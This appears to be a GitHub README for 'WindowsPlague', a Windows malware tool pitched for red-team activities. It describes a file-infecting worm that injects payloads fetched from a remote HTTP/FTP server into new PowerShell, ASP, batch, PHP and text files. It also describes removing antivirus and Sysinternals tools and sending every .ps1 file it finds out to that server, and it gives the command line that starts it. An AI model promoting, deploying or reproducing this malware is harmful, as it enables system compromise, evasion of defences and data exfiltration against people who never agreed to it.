# WindowsPlague

![logo](https://raw.githubusercontent.com/M507/WindowsPlague/master/Fullp.png)

WindowsPlague is Windows Malware built for Red-Team activities. Windows Malware monitors every new file in the system and infects it with a specific injection according to the kind of file. 


### Features:
----------
* Infects every new file in the system.
* Customized injections for each file.
* Quick removal for any antivirus.
* Quick removal for all Sysinternals binaries.
* Collects all ps1 files and transfers them to FTP server, to analyse.

### How does it work?
----------
It needs a server that must have:

| File name | Description                  |
|-----------|------------------------------|
| Ips1.dll  | for Powershell files.        |
| Iasp.dll  | for asp and aspx files.      |
| Ibat.dll  | for Batch files.             |
| Iphp.dll  | for PHP files.               |
| Itxt.dll  | for txt files.               |
| antiu.dll | for all prohibited keywords. |


Each dll file should have the injection code for each type of file.
Thus, each PHP file will be injected by the contact of Iphp.dll.

For example, If you do not want to inject txt files, do write anything in Itxt.dll, and this way it will not inject anything in txt files. But Itxt.dll must exist in the HTTP/FTP server.

### Run
----------
```sh
Microsoft Windows [Version 10.0.17763.503]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Mohd> WindowsPlague.exe <HTTP/FTP server>
```

<HTTP/FTP server> Is needed so that the WindowsPlague can download all the .dll files from and whenever it finds a ps1 file sends it to <HTTP/FTP server>. 
